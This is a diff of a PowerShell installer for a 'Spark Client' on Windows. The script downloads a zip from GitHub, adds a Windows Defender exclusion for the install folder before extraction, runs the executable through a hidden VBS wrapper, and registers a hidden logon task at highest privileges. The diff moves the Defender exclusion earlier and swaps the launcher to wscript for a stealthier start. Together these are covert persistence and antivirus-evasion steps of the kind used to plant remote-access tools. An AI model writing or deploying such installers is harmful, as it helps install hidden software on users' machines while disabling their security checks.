@@ -2,7 +2,7 @@
 # Auto install Spark Client on Windows
 # - Download client.zip from GitHub
 # - Extract client.exe to C:\Program Files\Spark
-# - Create run-client.ps1 wrapper to launch hidden
+# - Create run-client.vbs wrapper to launch hidden
 # - Register scheduled task at user logon (hidden, highest privileges)
 # - Add Windows Defender exclusion
 
@@ -12,7 +12,7 @@ $TempZip = Join-Path $env:TEMP "client.zip"
 
 $DestDir = "C:\Program Files\Spark"
 $DestExe = Join-Path $DestDir "client.exe"
-$Wrapper = Join-Path $DestDir "run-client.ps1"
+$WrapperVbs = Join-Path $DestDir "run-client.vbs"
 $TaskName = "SparkClient"
 
 $CurrentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
@@ -23,6 +23,15 @@ Write-Host ">>> Installing Spark Client for user: $CurrentUser"
 if (!(Test-Path -Path $DestDir)) {
     Write-Host ">>> Creating folder: $DestDir"
     New-Item -Path $DestDir -ItemType Directory -Force | Out-Null
+}
+
+# 1.1. Add Defender exclusion early
+Write-Host ">>> Adding Windows Defender exclusion: $DestDir"
+try {
+    Add-MpPreference -ExclusionPath $DestDir
+    Write-Host ">>> Defender exclusion added successfully."
+} catch {
+    Write-Warning ">>> Failed to add Defender exclusion (please run PowerShell as Administrator)."
 }
 
 # 2. Download client.zip
@@ -37,11 +46,12 @@ Expand-Archive -Path $TempZip -DestinationPath $DestDir -Force
 Write-Host ">>> Stopping existing client process (if any)"
 Get-Process -Name "client" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
 
-# 5. Create wrapper script (run hidden)
-Write-Host ">>> Creating wrapper script: $Wrapper"
-@"
-Start-Process -FilePath `"$DestExe`" -WindowStyle Hidden
-"@ | Out-File -FilePath $Wrapper -Encoding UTF8 -Force
+# 5. Create VBS wrapper to run client.exe hidden
+Write-Host ">>> Creating VBS wrapper: $WrapperVbs"
+$vbscode = @"
+CreateObject("Wscript.Shell").Run """$DestExe""", 0, False
+"@
+$vbscode | Out-File -FilePath $WrapperVbs -Encoding ASCII -Force
 
 # 6. Remove old scheduled task if exists
 if (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue) {
@@ -49,22 +59,13 @@ if (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue) {
     Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false
 }
 
-# 7. Register scheduled task (run hidden at logon)
+# 7. Register scheduled task (run hidden at logon, call VBS)
 Write-Host ">>> Registering scheduled task: $TaskName"
-$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -File `"$Wrapper`""
+$Action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$WrapperVbs`""
 $Trigger = New-ScheduledTaskTrigger -AtLogOn -User $CurrentUser
 $Settings = New-ScheduledTaskSettingsSet -Hidden -StartWhenAvailable -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
 $Principal = New-ScheduledTaskPrincipal -UserId $CurrentUser -LogonType Interactive -RunLevel Highest
 
 Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Principal $Principal
 
-# 8. Add Defender exclusion
-Write-Host ">>> Adding Windows Defender exclusion: $DestDir"
-try {
-    Add-MpPreference -ExclusionPath $DestDir
-    Write-Host ">>> Defender exclusion added successfully."
-} catch {
-    Write-Warning ">>> Failed to add Defender exclusion (please run PowerShell as Administrator)."
-}
-
-Write-Host ">>> Done. Spark Client will auto-start hidden when $CurrentUser logs in."
+Write-Host ">>> Done. Spark Client will auto-start hidden (via VBS) when $CurrentUser logs in."
